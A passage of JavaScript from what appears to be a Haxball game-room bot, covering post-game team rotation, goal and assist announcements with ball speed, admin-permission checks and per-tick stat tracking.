				inChooseMode = false;
				resetBtn();
				for (var i = 0; i < maxTeamSize; i++) {
					setTimeout(() => { randomBtn(); }, 400*i);
				}
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else if (lastWinner == Team.BLUE) {
					redToSpecBtn();
					blueToRedBtn();
				}
				else {
					resetBtn();
				}
				setTimeout(() => { topBtn(); }, 500);
			}
		}
		else {
			if (players.length == 2) {
				if (lastWinner == Team.BLUE) {
					room.setPlayerTeam(teamB[0].id, Team.RED);
					room.setPlayerTeam(teamR[0].id, Team.BLUE);
				}
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 3 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 4) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500);
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 5 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				activateChooseMode();
			}
			else if (players.length == 6) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500); }, 500);
				setTimeout(() => { room.startGame(); }, 2000);
			}
		}
	}
}

room.onGamePause = function(byPlayer) {
}

room.onGameUnpause = function (byPlayer) {
	if (teamR.length == 4 && teamB.length == 4 && inChooseMode || (teamR.length == teamB.length && teamS.length < 2 && inChooseMode)) {
		deactivateChooseMode();
	}
}

room.onTeamGoal = function(team) {
	activePlay = false;
	countAFK = false;
	const scores = room.getScores();
	game.scores = scores;
	if (lastPlayersTouched[0] != null && lastPlayersTouched[0].team == team) {
		if (lastPlayersTouched[1] != null && lastPlayersTouched[1].team == team) {
			room.sendChat("⚽ " + getTime(scores) + " Goal by " + lastPlayersTouched[0].name + " ! Assist by " + lastPlayersTouched[1].name + ". Goal speed : " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], lastPlayersTouched[1]));
		}
		else {
			room.sendChat("⚽ " + getTime(scores) + " Goal by " + lastPlayersTouched[0].name + " ! Goal speed : " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], null));
		}
	}
	else {
		room.sendChat("😂 " + getTime(scores) + " Own Goal by " + lastPlayersTouched[0].name + " ! Goal speed : " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
		game.goals.push(new Goal(scores.time, team, null, null));
	}
	if (scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit && scores.blue > 0 || goldenGoal == true)) {
		endGame(team);
		goldenGoal = false;
		setTimeout(() => { room.stopGame(); }, 1000);
	}
}

room.onPositionsReset = function() {
	countAFK = true;
	lastPlayersTouched = [null, null];
}

/* MISCELLANEOUS */

room.onRoomLink = function(url) {
}

room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
	if (getMute(changedPlayer) && changedPlayer.admin) {
		room.sendChat(changedPlayer.name + " has been unmuted.");
		setMute(changedPlayer, false);
	}
	if (byPlayer.id != 0 && localStorage.getItem(getAuth(byPlayer)) && JSON.parse(localStorage.getItem(getAuth(byPlayer)))[Ss.RL] == "admin") {
		room.sendChat("You don't have permission to name a player admin !", byPlayer.id);
		room.setPlayerAdmin(changedPlayer.id, false);
	}
}

room.onStadiumChange = function(newStadiumName, byPlayer) {
}

room.onGameTick = function() {
	checkTime();
	getLastTouchOfTheBall();
	getStats();
	handleInactivity();
}
